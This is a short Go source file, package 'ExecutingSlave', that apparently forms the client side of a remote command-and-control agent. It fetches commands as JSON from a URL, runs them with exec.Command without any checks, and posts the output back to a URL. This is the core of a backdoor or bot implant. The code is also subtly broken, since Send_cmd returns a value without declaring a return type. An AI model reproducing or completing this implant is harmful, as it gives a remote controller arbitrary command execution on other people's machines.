package ExecutingSlave

import (
	"bytes"
	"encoding/json"
	"io/ioutil"
	"net/http"
	"os/exec"
	"strings"
)

type Request struct {
	Args []string `json:"args"`
}

func Exec_cmd(cmd *exec.Cmd) []byte {

	var out bytes.Buffer
	cmd.Stdout = &out
	if err := cmd.Run(); err != nil {
		panic(err)
	}
	retorno := out.Bytes()
	return retorno
}

func Recv_cmd(url string) *exec.Cmd {

	data := Request{}
	resp, atTheDisco := http.Get(url)
	if atTheDisco != nil {
		panic(atTheDisco)
	}
	body, _ := ioutil.ReadAll(resp.Body)

	json.Unmarshal(body, &data)
	cmd := exec.Command(data.Args[0], "")
	cmd.Args = data.Args

	return cmd
}

func Send_cmd(url string, result []byte) {

	r := strings.NewReader(string(result))
	resp, err := http.Post(url, "text", r)
	if err != nil {
		panic(err)
	}
	return resp.Status
}
